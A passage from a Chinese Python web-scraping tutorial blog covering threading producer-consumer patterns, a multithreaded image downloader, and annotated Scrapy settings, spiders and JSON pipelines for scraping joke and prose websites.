                if queue.qsize() &lt; 1000:
                    for i in range(100):
                        count += 1
                        msg = &#39;生成产量&#39;+str(count)
                        #put是往queue中放入
                        queue.put(msg)
                        print(msg)
                time.sleep(0.5)
    class Consumer(threading.Thread):
        def run(self):
            global queue
            while True:
                if queue.qsize() &gt; 100:
                    for i in range(3):
                        #get从queue中取出一个值
                        msg = self.name + &quot;消费了&quot;+queue.get()
                        print(msg)
                time.sleep(1)
    if __name__ == &#39;__main__&#39;:
        queue = queue.Queue()
        for i in range(500):
            queue.put(&quot;初始产品&quot;+str(i))
        for i in range(2):
            p = Producer()
            p.start()
        for i in range(5):
            c = Consumer()
            c.start()
</code></pre>
<h3 id="爬虫之多线程"><a href="#爬虫之多线程" class="headerlink" title="爬虫之多线程"></a>爬虫之多线程</h3><ul>
<li>多线程爬虫框架代码</li>
</ul>
<pre><code class="python">    import requests
    from lxml import etree
    import os
    import re
    from queue import Queue
    import threading

    &quot;&quot;&quot; 
    我们引入了threading这个包，我们将使用这个包中的
    Thread类，并在我们自定义的类中继承这个Thread类
    &quot;&quot;&quot;


    # 生产者线程
    class Procuder(threading.Thread):
        headers = &#123;
                &#39;User-Agent&#39;: &#39;... 浏览器...&#39;
        &#125;

        &quot;&quot;&quot; 重写继承于父类的__init__方法 &quot;&quot;&quot;
        &quot;&quot;&quot; 我们继承了Thread这个类，在调用类中的方法时可能需要许多参数，我们用*args和**kwargs来接收&quot;&quot;&quot;
        def __init__(self, page_queue, img_queue, *args, **kwargs):
            super(Procuder, self).__init__(*args, **kwargs)
            self.page_queue = page_queue
            self.img_queue = img_queue

        &quot;&quot;&quot; 重写继承于父类的run方法，改成我们想要的方法&quot;&quot;&quot;
        &quot;&quot;&quot; 从存放每页的url的队列中逐一挑出一个url并传入parse_page中
            获取每页的url
        &quot;&quot;&quot;
        def run(self):
            while True:
                if self.page_queue.empty():
                    break
                url = self.page_queue.get()
                self.parse_page(url)

        def parse_page(self, url):
            &quot;&quot;&quot; 
            .......

            获取每页的响应数据，并从中提取出每张图片的
            url和name，并放入队列中
            &quot;&quot;&quot;


    # 消费者线程
    class Consumer(threading.Thread):
        def __init__(self, page_queue, img_queue, *args, **kwargs):
            super(Procuder, self).__init__(*args, **kwargs)
            self.page_queue = page_queue
            self.img_queue = img_queue

        def run(self):
            while True:
                if self.img_queue.empty() and self.page_queue.empty():
                    break
                    &quot;&quot;&quot;
                    ......

                    利用从队列中获取的每张图片的url和name，进行图片的获取和永久储存
                    &quot;&quot;&quot;

    def main():
        &quot;&quot;&quot; 设置页数和图片的url队列&quot;&quot;&quot;
        page_queue = Queue()
        img_queue = Queue()

        # 将每页的url放到页数队列中
        for x in range(1, 101):
            url = &#39;http://........ %d&#39; % x
            page_queue.put(url)

        # 设置5个生产者线程
        for x in range(5):
            t = Procuder(page_queue, img_queue)
            t.start()

        # 设置5个消费者线程
        for x in range(5):
            t = Consumer(page_queue, img_queue)
            t.start()


    if __name__ == &#39;__main__&#39;:
        main()
</code></pre>
<ul>
<li>多线程爬虫实战代码</li>
</ul>
<pre><code class="python">    import requests
    import re
    from lxml import etree
    import threading
    import os
    import queue
    from urllib import request

    # 生产图片的url和name
    class ProimgUrl(threading.Thread):
        def __init__(self, page_queue, img_queue, headers, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.page_queue = page_queue
            self.img_queue = img_queue
            self.headers = headers

        def run(self):
            while True:
                if self.page_queue.empty():
                    break
                else:
                    url = self.page_queue.get()
                    self.parse_page(url)

        def parse_page(self, url):
            img_get = requests.get(url=url, headers=self.headers).text
            tree = etree.HTML(img_get)
            img_it = tree.xpath(&#39;//div[@class=&quot;page-content text-center&quot;]//a&#39;)
            for it in img_it:
                img_url = it.xpath(&#39;./img[@class!=&quot;gif&quot;]/@data-original&#39;)[0]
                alt = it.xpath(&#39;./img/@alt&#39;)[0]
                alt = re.sub(r&#39;[\?？.!！，。\/\*]&#39;, &#39;&#39;, alt)
                # 利用splitext截取图片的后缀名
                suffix = os.path.splitext(img_url)[1]
                img_name = alt + suffix
                self.img_queue.put((img_url, img_name))


    # 获取图片并储存
    class ConimgName(threading.Thread):
        def __init__(self, page_queue, img_queue, headers, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.page_queue = page_queue
            self.img_queue = img_queue
            self.headers = headers

        def run(self):
            while True:
                if self.img_queue.empty() and self.page_queue.empty():
                    break
                else:
                    img_url, img_name = self.img_queue.get()
                    # 用urlli包下的request.urlretrieve模块，可以更方便的获取和存储图片
                    request.urlretrieve(img_url, &#39;./smile/&#39;+img_name)
                    print(img_name + &#39; 下载成功...&#39;)

    def main():
        if not os.path.exists(&#39;./smile&#39;):
            os.mkdir(&#39;./smile&#39;)
        headers = &#123;
            &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;
                          &#39;Chrome/80.0.3987.149 Safari/537.36 &#39;
        &#125;
        page_queue = queue.Queue(100)
        img_queue = queue.Queue(1000)

        for x in range(1, 10):
            url = &#39;https://www.doutula.com/photo/list/?page=&#39; + str(x)
            page_queue.put(url)

        for i in range(5):
            t = ProimgUrl(page_queue, img_queue, headers)
            t.start()

        for i in range(5):
            t = ConimgName(page_queue, img_queue, headers)
            t.start()


    if __name__ == &#39;__main__&#39;:
        main()
</code></pre>
<ul>
<li>多线程爬虫的一些坑：多线程爬虫爬取的内容是无序的</li>
</ul>
<h1 id="爬虫第五天"><a href="#爬虫第五天" class="headerlink" title="爬虫第五天"></a>爬虫第五天</h1><h2 id="scrapy爬虫框架"><a href="#scrapy爬虫框架" class="headerlink" title="scrapy爬虫框架"></a>scrapy爬虫框架</h2><p><a href="https://zhuanlan.zhihu.com/p/25443389">关于xpath选择器selector的网址</a></p>
<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20200328091921480.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="scrapy框架示意图"></p>
<ol>
<li><p>创建项目</p>
<p>​    scrapy startproject #^%#^(项目名字)</p>
</li>
</ol>
<ol start="2">
<li><p>创建爬虫</p>
<p>​    scrapy genspider 爬虫名字 网络域名</p>
<p>注意：</p>
<ul>
<li>爬虫名字不要和项目名字一样</li>
<li>网站域名是允许爬虫采集的域名<ul>
<li>baidu.com</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><img "" class="lazyload placeholder" data-original="https://img-blog.csdn.net/20180704211604860?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMzNDcyNzY1/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="创建项目与配置环境后各部分组件"></p>
<p>item文件是存储数据的</p>
<ul>
<li><p>在setting文件（程序启动被首先检查的文件）</p>
</li>
<li><p>BOT_NAME = 爬虫的名字</p>
</li>
<li><p>ROBOTSTXT_OBEY = 网络君子协议君子协议（不遵守）， 布尔</p>
</li>
<li><p>CONCURRENT_REQUESTS = 爬虫的并发量</p>
</li>
<li><p>DOWOLOAD_DELAY = 下载延迟，一般是1.5或2，小项目不用管</p>
</li>
<li><p>COOKLES_ENABLED = cookiede的使用，布尔</p>
</li>
<li><p>DEFAULT_REQUEST_HEADERS = 默认请求头</p>
</li>
<li><p>ITEM_PIPELINES = 管道文件</p>
</li>
</ul>
<h3 id="setting文件详解"><a href="#setting文件详解" class="headerlink" title="setting文件详解"></a>setting文件详解</h3><pre><code class="python">  # -*- coding: utf-8 -*-

  # Scrapy settings for TestSpider project
  #
  # For simplicity, this file contains only settings considered important or
  # commonly used. You can find more settings consulting the documentation:
  #
  #     https://doc.scrapy.org/en/latest/topics/settings.html
  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html
  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html

  BOT_NAME = &#39;TestSpider&#39;

  SPIDER_MODULES = [&#39;TestSpider.spiders&#39;]
  NEWSPIDER_MODULE = &#39;TestSpider.spiders&#39;


  # Crawl responsibly by identifying yourself (and your website) on the user-agent
  #USER_AGENT = &#39;TestSpider (+http://www.yourdomain.com)&#39;

  USER_AGENT = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&#39;

  # Obey robots.txt rules
  # Scrapy框架默认遵守 robots.txt 协议规则，robots规定了一个网站中，哪些地址可以请求，哪些地址不能请求。
  # 默认是True，设置为False不遵守这个协议。
  ROBOTSTXT_OBEY = False


  # Configure maximum concurrent requests performed by Scrapy (default: 16)
  # 配置scrapy的请求连接数，默认会同时并发16个请求。
  # CONCURRENT_REQUESTS = 10

  # Configure a delay for requests for the same website (default: 0)
  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay
  # See also autothrottle settings and docs

  # 下载延时，请求和请求之间的间隔，降低爬取速度，default: 0
  # DOWNLOAD_DELAY = 3


  # CONCURRENT_REQUESTS_PER_DOMAIN：针对网站(主域名)设置的最大请求并发数。
  # CONCURRENT_REQUESTS_PER_IP：某一个IP的最大请求并发数。
  # The download delay setting will honor only one of:
  # CONCURRENT_REQUESTS_PER_DOMAIN = 16
  # CONCURRENT_REQUESTS_PER_IP = 16


  # Disable cookies (enabled by default)
  # 是否启用Cookie的配置，默认是可以使用Cookie的。主要是针对一些网站是禁用Cookie的。
  # COOKIES_ENABLED = False

  # Disable Telnet Console (enabled by default)
  #TELNETCONSOLE_ENABLED = False


  # Override the default request headers:

  # 配置默认的请求头Headers.
  # DEFAULT_REQUEST_HEADERS = &#123;
  #   &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
  #   &#39;Accept-Language&#39;: &#39;en&#39;,
  # &#125;


  # Enable or disable spider middlewares
  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html

  # 配置自定义爬虫中间件，scrapy也默认启用了一些爬虫中间件，可以在这个配置中关闭。
  # SPIDER_MIDDLEWARES = &#123;
  #    &#39;TestSpider.middlewares.TestspiderSpiderMiddleware&#39;: 543,
  # &#125;


  # 下载中间件，配置自定义的中间件或者取消Scrapy默认启用的中间件。
  # Enable or disable downloader middlewares
  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html
  # DOWNLOADER_MIDDLEWARES = &#123;
  #    &#39;TestSpider.middlewares.TestspiderDownloaderMiddleware&#39;: 543,
  # &#125;


  # Enable or disable extensions
  # See https://doc.scrapy.org/en/latest/topics/extensions.html
  # EXTENSIONS = &#123;
  #    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,
  # &#125;


  # Configure item pipelines
  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html

  # 配置自定义的PIPELINES，或者取消PIPELINES默认启用的中间件。
  # ITEM_PIPELINES = &#123;
  #    &#39;TestSpider.pipelines.TestspiderPipeline&#39;: 300,
  # &#125;


  # 限速配置
  # Enable and configure the AutoThrottle extension (disabled by default)
  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html

  # 是否开启自动限速
  # AUTOTHROTTLE_ENABLED = True


  # The initial download delay
  # 配置初始url的下载延时
  # AUTOTHROTTLE_START_DELAY = 5


  # The maximum download delay to be set in case of high latencies
  # 配置最大请求时间
  # AUTOTHROTTLE_MAX_DELAY = 60


  # 配置请求和请求之间的下载间隔，单位是秒
  # The average number of requests Scrapy should be sending in parallel to
  # each remote server
  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0


  # Enable showing throttling stats for every response received:
  # AUTOTHROTTLE_DEBUG = False


  # 关于Http缓存的配置，默认是不启用。
  # 对于同一个页面的请求进行数据的缓存，如果后续还有相同的请求，直接从缓存中进行获取。
  # Enable and configure HTTP caching (disabled by default)
  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings
  #HTTPCACHE_ENABLED = True
  #HTTPCACHE_EXPIRATION_SECS = 0
  #HTTPCACHE_DIR = &#39;httpcache&#39;
  #HTTPCACHE_IGNORE_HTTP_CODES = []
  #HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;</code></pre>
<h3 id="scrapy爬虫之spider类（示例-一：爬取糗事百科）"><a href="#scrapy爬虫之spider类（示例-一：爬取糗事百科）" class="headerlink" title="scrapy爬虫之spider类（示例 一：爬取糗事百科）"></a>scrapy爬虫之spider类（示例 一：爬取糗事百科）</h3><ul>
<li><p>创建爬虫项目：scrapy startproject xiushi</p>
</li>
<li><p>创建爬虫文件:   scrapy genSpider xiushiSpider  qiushidabaike.com</p>
<h4 id="item-部分"><a href="#item-部分" class="headerlink" title="item 部分"></a>item 部分</h4><pre><code class="python"># -*- coding: utf-8 -*-

# Define here the models for your scraped items
#
# See documentation in:
# https://doc.scrapy.org/en/latest/topics/items.html

import scrapy

</code></pre>
</li>
</ul>
<p>  class XiushiItem(scrapy.Item):<br>      # define the fields for your item here like:<br>      # name = scrapy.Field()<br>      title = scrapy.Field()<br>      text = scrapy.Field()</p>
<pre><code>
  #### setting 部分

  ```python
  # -*- coding: utf-8 -*-

  # Scrapy settings for xiushi project
  #
  # For simplicity, this file contains only settings considered important or
  # commonly used. You can find more settings consulting the documentation:
  #
  #     https://doc.scrapy.org/en/latest/topics/settings.html
  #     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html
  #     https://doc.scrapy.org/en/latest/topics/spider-middleware.html

  BOT_NAME = &#39;xiushi&#39;

  SPIDER_MODULES = [&#39;xiushi.spiders&#39;]
  NEWSPIDER_MODULE = &#39;xiushi.spiders&#39;

  # Crawl responsibly by identifying yourself (and your website) on the user-agent
  # USER_AGENT = &#39;xiushi (+http://www.yourdomain.com)&#39;

  # Obey robots.txt rules
  ROBOTSTXT_OBEY = False

  # Configure maximum concurrent requests performed by Scrapy (default: 16)
  # CONCURRENT_REQUESTS = 32

  # Configure a delay for requests for the same website (default: 0)
  # See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay
  # See also autothrottle settings and docs
  DOWNLOAD_DELAY = 1
  # The download delay setting will honor only one of:
  # CONCURRENT_REQUESTS_PER_DOMAIN = 16
  # CONCURRENT_REQUESTS_PER_IP = 16

  # Disable cookies (enabled by default)
  # COOKIES_ENABLED = False

  # Disable Telnet Console (enabled by default)
  # TELNETCONSOLE_ENABLED = False

  # Override the default request headers:
  DEFAULT_REQUEST_HEADERS = &#123;
      &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
      &#39;Accept-Language&#39;: &#39;en&#39;,
      &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;
                    &#39;Chrome/80.0.3987.163 Safari/537.36 &#39;
  &#125;

  # Enable or disable spider middlewares
  # See https://doc.scrapy.org/en/latest/topics/spider-middleware.html
  # SPIDER_MIDDLEWARES = &#123;
  #    &#39;xiushi.middlewares.XiushiSpiderMiddleware&#39;: 543,
  # &#125;

  # Enable or disable downloader middlewares
  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html
  # DOWNLOADER_MIDDLEWARES = &#123;
  #    &#39;xiushi.middlewares.XiushiDownloaderMiddleware&#39;: 543,
  # &#125;

  # Enable or disable extensions
  # See https://doc.scrapy.org/en/latest/topics/extensions.html
  # EXTENSIONS = &#123;
  #    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,
  # &#125;

  # Configure item pipelines
  # See https://doc.scrapy.org/en/latest/topics/item-pipeline.html
  ITEM_PIPELINES = &#123;
     &#39;xiushi.pipelines.XiushiPipeline&#39;: 300,
  &#125;

  # Enable and configure the AutoThrottle extension (disabled by default)
  # See https://doc.scrapy.org/en/latest/topics/autothrottle.html
  # AUTOTHROTTLE_ENABLED = True
  # The initial download delay
  # AUTOTHROTTLE_START_DELAY = 5
  # The maximum download delay to be set in case of high latencies
  # AUTOTHROTTLE_MAX_DELAY = 60
  # The average number of requests Scrapy should be sending in parallel to
  # each remote server
  # AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0
  # Enable showing throttling stats for every response received:
  # AUTOTHROTTLE_DEBUG = False

  # Enable and configure HTTP caching (disabled by default)
  # See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings
  # HTTPCACHE_ENABLED = True
  # HTTPCACHE_EXPIRATION_SECS = 0
  # HTTPCACHE_DIR = &#39;httpcache&#39;
  # HTTPCACHE_IGNORE_HTTP_CODES = []
  # HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;
</code></pre><h4 id="spider-部分"><a href="#spider-部分" class="headerlink" title="spider 部分"></a>spider 部分</h4><pre><code class="python">  # -*- coding: utf-8 -*-
  import scrapy
  from xiushi.items import XiushiItem


  class XiushispiderSpider(scrapy.Spider):
      name = &#39;xiushiSpider&#39;
      allowed_domains = [&#39;qiushidabaike.com&#39;]
      start_urls = [&#39;http://qiushidabaike.com/index_1.html&#39;]
      base_domain = &#39;http://qiushidabaike.com&#39;

      def parse(self, response):
          duanzi = response.xpath(&#39;//div[@class=&quot;main-left fl&quot;]//dl&#39;)
          for it in duanzi:
              title = it.xpath(&#39;./dt/span/a/text()&#39;).get().strip()
              text = it.xpath(&#39;./dd[@class=&quot;content&quot;]//text()&#39;).getall()
              text = &quot;&quot;.join(text).strip()
              item = XiushiItem(title=title, text=text)
              yield item
          # 进行翻页操作
          next_url = response.xpath(&#39;//div[@class=&quot;page&quot;]//a[@class=&quot;next&quot;]/@href&#39;).get()
          if not next_url:
              return
          else:
              yield scrapy.Request(self.base_domain+next_url, callback=self.parse)
</code></pre>
<h4 id="pipelines-部分"><a href="#pipelines-部分" class="headerlink" title="pipelines 部分"></a>pipelines 部分</h4><pre><code class="python">  # -*- coding: utf-8 -*-

  # Define your item pipelines here
  #
  # Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting
  # See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html
  &quot;&quot;&quot;
  # 第一种方法，没进行json优化，但是看起来简单易操作
  import json


  class XiushiPipeline(object):
      def __init__(self):
          self.fp = open(&#39;duanzi.json&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;)

      def open_spider(self, spider):
          print(&#39;爬虫开始了...&#39;)

      def process_item(self, item, spider):
          item_json = json.dumps(dict(item),  ensure_ascii=False)
          self.fp.write(item_json+&#39;\n&#39;)
          return item

      def close_spider(self, spider):
          self.fp.close()
          print(&quot;爬虫结束了...&quot;)
  &quot;&quot;&quot;
  # 方案二，json优化，结果是每个字典存储在列表中
  #        好处是满足json规则，坏处是数据量较大时比较耗内存
  # &#39;&#39;&#39; 自我感觉这种方法不咋地 &#39;&#39;&#39;
  # from scrapy.exporters import JsonItemExporter
  #
  #
  # class XiushiPipeline(object):
  #     def __init__(self):
  #         # 注意此时以二进制形式写入
  #         self.fp = open(&#39;duanzi.json&#39;, &#39;wb&#39;)
  #         self.exporter = JsonItemExporter(self.fp, ensure_ascii=False, encoding=&#39;utf-8&#39;)
  #         self.exporter.start_exporting()
  #
  #     def open_spider(self, spider):
  #         print(&#39;爬虫开始了...&#39;)
  #
  #     def process_item(self, item, spider):
  #         self.exporter.export_item(item)
  #         return item
  #
  #     def close_spider(self, spider):
  #         self.exporter.finish_exporting()
  #         self.fp.close()
  #         print(&quot;爬虫结束了...&quot;)

  &#39;&#39;&#39;方案三&#39;&#39;&#39;
  from scrapy.exporters import JsonLinesItemExporter


  class XiushiPipeline(object):
      def __init__(self):
          # 注意此时以二进制形式写入
          self.fp = open(&#39;duanzi.json&#39;, &#39;wb&#39;)
          self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False, encoding=&#39;utf-8&#39;)

      def open_spider(self, spider):
          print(&#39;爬虫开始了...&#39;)

      def process_item(self, item, spider):
          self.exporter.export_item(item)
          return item

      def close_spider(self, spider):
          self.fp.close()
          print(&quot;爬虫结束了...&quot;)
</code></pre>
<ul>
<li>可以在总文件中创建.py文件，代替爬虫开始命令 scrapy crawl xiushiSpider (注意应在爬虫目录下执行该命令)</li>
</ul>
<pre><code class="python">from scrapy import cmdline

cmdline.execute(&quot;scrapy crawl xiushiSpider&quot;.split())
# cmdline.execute([&quot;scrapy&quot;, &#39;crawl&#39;, &#39;xiushiSpider&#39;])</code></pre>
<h1 id="爬虫第六天"><a href="#爬虫第六天" class="headerlink" title="爬虫第六天"></a>爬虫第六天</h1><h3 id="scrapy-框架之spider类（示例二-爬取优美散文）"><a href="#scrapy-框架之spider类（示例二-爬取优美散文）" class="headerlink" title="scrapy 框架之spider类（示例二.爬取优美散文）"></a>scrapy 框架之spider类（示例二.爬取优美散文）</h3><ul>
<li>item部分</li>
</ul>
<pre><code class="python"># -*- coding: utf-8 -*-

# Define here the models for your scraped items
#
# See documentation in:
# https://doc.scrapy.org/en/latest/topics/items.html

import scrapy


class ProseItem(scrapy.Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    title = scrapy.Field()
    text = scrapy.Field()
</code></pre>
<ul>
<li>settings部分</li>
</ul>
<pre><code class="python"># -*- coding: utf-8 -*-

# Scrapy settings for prose project
#
# For simplicity, this file contains only settings considered important or
# commonly used. You can find more settings consulting the documentation:
#
#     https://doc.scrapy.org/en/latest/topics/settings.html
#     https://doc.scrapy.org/en/latest/topics/downloader-middleware.html
#     https://doc.scrapy.org/en/latest/topics/spider-middleware.html

BOT_NAME = &#39;prose&#39;

SPIDER_MODULES = [&#39;prose.spiders&#39;]
NEWSPIDER_MODULE = &#39;prose.spiders&#39;

# Crawl responsibly by identifying yourself (and your website) on the user-agent
# USER_AGENT = &#39;prose (+http://www.yourdomain.com)&#39;

# Obey robots.txt rules
ROBOTSTXT_OBEY = False

# Configure maximum concurrent requests performed by Scrapy (default: 16)
# CONCURRENT_REQUESTS = 32

# Configure a delay for requests for the same website (default: 0)
# See https://doc.scrapy.org/en/latest/topics/settings.html#download-delay
# See also autothrottle settings and docs
DOWNLOAD_DELAY = 1
# The download delay setting will honor only one of:
# CONCURRENT_REQUESTS_PER_DOMAIN = 16
# CONCURRENT_REQUESTS_PER_IP = 16

# Disable cookies (enabled by default)
# COOKIES_ENABLED = False

# Disable Telnet Console (enabled by default)
# TELNETCONSOLE_ENABLED = False

# Override the default request headers:
DEFAULT_REQUEST_HEADERS = &#123;
    &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
    &#39;Accept-Language&#39;: &#39;en&#39;,
    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &#39;
                  &#39;Chrome/80.0.3987.163 Safari/537.36 &#39;
&#125;

# Enable or disable spider middlewares
# See https://doc.scrapy.org/en/latest/topics/spider-middleware.html
# SPIDER_MIDDLEWARES = &#123;
#    &#39;prose.middlewares.ProseSpiderMiddleware&#39;: 543,
# &#125;

# Enable or disable downloader middlewares
# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html
# DOWNLOADER_MIDDLEWARES = &#123;
#    &#39;prose.middlewares.ProseDownloaderMiddleware&#39;: 543,
# &#125;

# Enable or disable extensions
# See https://doc.scrapy.org/en/latest/topics/extensions.html
# EXTENSIONS = &#123;
#    &#39;scrapy.extensions.telnet.TelnetConsole&#39;: None,
# &#125;

# Configure item pipelines
# See https://doc.scrapy.org/en/latest/topics/item-pipeline.html
ITEM_PIPELINES = &#123;
   &#39;prose.pipelines.ProsePipeline&#39;: 300,
&#125;

# Enable and configure the AutoThrottle extension (disabled by default)
# See https://doc.scrapy.org/en/latest/topics/autothrottle.html
# AUTOTHROTTLE_ENABLED = True
# The initial download delay
# AUTOTHROTTLE_START_DELAY = 5
# The maximum download delay to be set in case of high latencies
# AUTOTHROTTLE_MAX_DELAY = 60
# The average number of requests Scrapy should be sending in parallel to
# each remote server
# AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0
# Enable showing throttling stats for every response received:
# AUTOTHROTTLE_DEBUG = False

# Enable and configure HTTP caching (disabled by default)
# See https://doc.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings
# HTTPCACHE_ENABLED = True
# HTTPCACHE_EXPIRATION_SECS = 0
# HTTPCACHE_DIR = &#39;httpcache&#39;
# HTTPCACHE_IGNORE_HTTP_CODES = []
# HTTPCACHE_STORAGE = &#39;scrapy.extensions.httpcache.FilesystemCacheStorage&#39;
</code></pre>
<ul>
<li>proseSpider部分</li>
</ul>
<pre><code class="python"># -*- coding: utf-8 -*-
import scrapy
from prose.items import ProseItem


class ProsespiderSpider(scrapy.Spider):
    name = &#39;proseSpider&#39;
    allowed_domains = [&#39;duwenzhang.com&#39;]
    start_urls = [&#39;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#39;]
    base_url = &#39;http://www.duwenzhang.com/wenzhang/shenghuosuibi/&#39;

    def parse(self, response):
        # xpath 选择不含有某一属性的标签
        url_list = response.xpath(&#39;//center//tr[2]//td[(@valign) and not(@height)]/table&#39;)
        for it in url_list:
            title = it.xpath(&#39;.//tr[2]//td[@height=&quot;26&quot;]/b/a/text()&#39;).getall()
            text = it.xpath(&#39;.//tr[4]/td[@style=&quot;padding-left:3px&quot;]/text()&#39;).getall()
            text = &quot;&quot;.join(text).strip()
            item = ProseItem(title=title, text=text)
            yield item
        # //a[contains(text(), &quot;百度搜索&quot;)]  【可以部分检索】
        # //a[text()=&quot;文字内容&quot;] 【需要填全】 xpath定位指定文本标签
        next_url = response.xpath(&#39;//tr//a[text()=&quot;下一页&quot;]/@href&#39;).get()
        if not next_url:
            return
        else:
            yield scrapy.Request(self.base_url+next_url, callback=self.parse)

</code></pre>
<ul>
<li>piplines 部分</li>
</ul>
<pre><code class="python"># -*- coding: utf-8 -*-

# Define your item pipelines here
#
# Don&#39;t forget to add your pipeline to the ITEM_PIPELINES setting
# See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html

import json
from scrapy.exporters import JsonLinesItemExporter


class ProsePipeline(object):
    def __init__(self):
        self.fp = open(&#39;prose.json&#39;, &#39;wb&#39;)
        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=False,
                                              encoding=&#39;utf-8&#39;)

    def open_spider(self, spider):
        print(&#39;爬虫开始了...&#39;)

    def process_item(self, item, spider):
        self.exporter.export_item(item)
        return item

    def close_spider(self, spider):
        self.fp.close()
        print(&#39;爬虫结束了....&#39;)</code></pre>
]]></content>
      <categories>
        <category>爬虫</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
</search>
